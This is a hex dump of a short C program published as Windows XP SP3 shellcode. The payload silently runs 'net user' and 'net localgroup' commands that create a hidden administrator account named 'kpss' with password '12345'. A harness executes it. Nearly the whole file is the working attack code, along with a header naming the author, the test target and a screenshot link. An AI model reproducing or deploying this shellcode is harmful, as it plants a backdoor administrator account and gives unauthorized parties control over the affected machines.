00000000  23 20 54 69 74 6c 65 20  20 20 20 20 20 3a 20 77  |# Title      : w|
00000010  69 6e 33 32 2f 50 65 72  66 65 63 74 58 70 2d 70  |in32/PerfectXp-p|
00000020  63 31 2f 73 70 33 20 28  54 72 29 20 41 64 64 20  |c1/sp3 (Tr) Add |
00000030  41 64 6d 69 6e 20 53 68  65 6c 6c 63 6f 64 65 20  |Admin Shellcode |
00000040  31 31 32 20 62 79 74 65  73 0d 0a 23 20 41 75 74  |112 bytes..# Aut|
00000050  68 6f 72 20 20 20 20 20  3a 20 4b 61 48 50 65 53  |hor     : KaHPeS|
00000060  65 53 65 0d 0a 23 20 53  63 72 65 65 6e 73 68 6f  |eSe..# Screensho|
00000070  74 20 3a 20 68 74 74 70  3a 2f 2f 69 35 33 2e 74  |t : http://i53.t|
00000080  69 6e 79 70 69 63 2e 63  6f 6d 2f 32 38 39 79 61  |inypic.com/289ya|
00000090  6d 71 2e 6a 70 67 20 0d  0a 23 20 44 65 73 63 2e  |mq.jpg ..# Desc.|
000000a0  20 20 20 20 20 20 3a 20  75 73 72 3a 20 6b 70 73  |      : usr: kps|
000000b0  73 20 2c 20 70 61 73 73  3a 20 31 32 33 34 35 20  |s , pass: 12345 |
000000c0  2c 20 6c 6f 63 61 6c 67  72 6f 75 70 3a 20 41 64  |, localgroup: Ad|
000000d0  6d 69 6e 69 73 74 72 61  74 6f 72 0d 0a 23 20 54  |ministrator..# T|
000000e0  65 73 74 65 64 20 6f 6e  20 20 3a 20 50 45 52 46  |ested on  : PERF|
000000f0  45 43 54 20 58 50 20 50  43 31 20 2f 20 53 50 33  |ECT XP PC1 / SP3|
00000100  0d 0a 23 20 44 61 74 65  20 20 20 20 20 20 20 3a  |..# Date       :|
00000110  20 31 38 2f 30 37 2f 32  30 31 31 0d 0a 23 20 4e  | 18/07/2011..# N|
00000120  6f 74 20 20 20 20 20 20  20 20 3a 20 61 2e 71 20  |ot        : a.q |
00000130  6b 70 73 73 20 3a 28 28  0d 0a 20 20 0d 0a 23 69  |kpss :((..  ..#i|
00000140  6e 63 6c 75 64 65 20 3c  73 74 64 69 6f 2e 68 3e  |nclude <stdio.h>|
00000150  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 72 69  |..#include <stri|
00000160  6e 67 2e 68 3e 0d 0a 23  69 6e 63 6c 75 64 65 20  |ng.h>..#include |
00000170  3c 73 74 64 6c 69 62 2e  68 3e 0d 0a 20 20 20 0d  |<stdlib.h>..   .|
00000180  0a 69 6e 74 20 6d 61 69  6e 28 29 7b 0d 0a 20 20  |.int main(){..  |
00000190  20 20 20 20 0d 0a 20 20  20 20 75 6e 73 69 67 6e  |    ..    unsign|
000001a0  65 64 20 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |ed char shellcod|
000001b0  65 5b 5d 3d 0d 0a 20 20  20 20 22 5c 78 65 62 5c  |e[]=..    "\xeb\|
000001c0  78 31 62 5c 78 35 62 5c  78 33 31 5c 78 63 30 5c  |x1b\x5b\x31\xc0\|
000001d0  78 35 30 5c 78 33 31 5c  78 63 30 5c 78 38 38 5c  |x50\x31\xc0\x88\|
000001e0  78 34 33 5c 78 34 65 5c  78 35 33 5c 78 62 62 5c  |x43\x4e\x53\xbb\|
000001f0  78 30 64 5c 78 32 35 5c  78 38 36 5c 78 37 63 22  |x0d\x25\x86\x7c"|
00000200  0d 0a 20 20 20 20 22 5c  78 66 66 5c 78 64 33 5c  |..    "\xff\xd3\|
00000210  78 33 31 5c 78 63 30 5c  78 35 30 5c 78 62 62 5c  |x31\xc0\x50\xbb\|
00000220  78 31 32 5c 78 63 62 5c  78 38 31 5c 78 37 63 5c  |x12\xcb\x81\x7c\|
00000230  78 66 66 5c 78 64 33 5c  78 65 38 5c 78 65 30 5c  |xff\xd3\xe8\xe0\|
00000240  78 66 66 5c 78 66 66 5c  78 66 66 22 0d 0a 20 20  |xff\xff\xff"..  |
00000250  20 20 22 5c 78 36 33 5c  78 36 64 5c 78 36 34 5c  |  "\x63\x6d\x64\|
00000260  78 32 65 5c 78 36 35 5c  78 37 38 5c 78 36 35 5c  |x2e\x65\x78\x65\|
00000270  78 32 30 5c 78 32 66 5c  78 36 33 5c 78 32 30 5c  |x20\x2f\x63\x20\|
00000280  78 36 65 5c 78 36 35 5c  78 37 34 5c 78 32 30 5c  |x6e\x65\x74\x20\|
00000290  78 37 35 5c 78 37 33 22  0d 0a 20 20 20 20 22 5c  |x75\x73"..    "\|
000002a0  78 36 35 5c 78 37 32 5c  78 32 30 5c 78 36 62 5c  |x65\x72\x20\x6b\|
000002b0  78 37 30 5c 78 37 33 5c  78 37 33 5c 78 32 30 5c  |x70\x73\x73\x20\|
000002c0  78 33 31 5c 78 33 32 5c  78 33 33 5c 78 33 34 5c  |x31\x32\x33\x34\|
000002d0  78 33 35 5c 78 32 30 5c  78 32 66 5c 78 36 31 5c  |x35\x20\x2f\x61\|
000002e0  78 36 34 22 0d 0a 20 20  20 20 22 5c 78 36 34 5c  |x64"..    "\x64\|
000002f0  78 32 30 5c 78 32 36 5c  78 32 36 5c 78 32 30 5c  |x20\x26\x26\x20\|
00000300  78 36 65 5c 78 36 35 5c  78 37 34 5c 78 32 30 5c  |x6e\x65\x74\x20\|
00000310  78 36 63 5c 78 36 66 5c  78 36 33 5c 78 36 31 5c  |x6c\x6f\x63\x61\|
00000320  78 36 63 5c 78 36 37 5c  78 37 32 5c 78 36 66 22  |x6c\x67\x72\x6f"|
00000330  0d 0a 20 20 20 20 22 5c  78 37 35 5c 78 37 30 5c  |..    "\x75\x70\|
00000340  78 32 30 5c 78 34 31 5c  78 36 34 5c 78 36 64 5c  |x20\x41\x64\x6d\|
00000350  78 36 39 5c 78 36 65 5c  78 36 39 5c 78 37 33 5c  |x69\x6e\x69\x73\|
00000360  78 37 34 5c 78 37 32 5c  78 36 31 5c 78 37 34 5c  |x74\x72\x61\x74\|
00000370  78 36 66 5c 78 37 32 5c  78 37 33 22 0d 0a 20 20  |x6f\x72\x73"..  |
00000380  20 20 22 5c 78 32 30 5c  78 32 66 5c 78 36 31 5c  |  "\x20\x2f\x61\|
00000390  78 36 34 5c 78 36 34 5c  78 32 30 5c 78 36 62 5c  |x64\x64\x20\x6b\|
000003a0  78 37 30 5c 78 37 33 5c  78 37 33 22 3b 0d 0a 20  |x70\x73\x73";.. |
000003b0  20 20 0d 0a 20 20 20 20  70 72 69 6e 74 66 28 22  |  ..    printf("|
000003c0  53 69 7a 65 20 3d 20 25  64 20 62 79 74 65 73 5c  |Size = %d bytes\|
000003d0  6e 22 2c 20 73 74 72 6c  65 6e 28 73 68 65 6c 6c  |n", strlen(shell|
000003e0  63 6f 64 65 29 29 3b 0d  0a 20 20 20 0d 0a 20 20  |code));..   ..  |
000003f0  20 20 28 28 76 6f 69 64  20 28 2a 29 28 29 29 73  |  ((void (*)())s|
00000400  68 65 6c 6c 63 6f 64 65  29 28 29 3b 0d 0a 20 20  |hellcode)();..  |
00000410  20 20 20 20 0d 0a 20 20  20 20 20 20 0d 0a 20 20  |    ..      ..  |
00000420  20 0d 0a 20 20 20 20 72  65 74 75 72 6e 20 30 3b  | ..    return 0;|
00000430  0d 0a 7d                                          |..}|
00000433
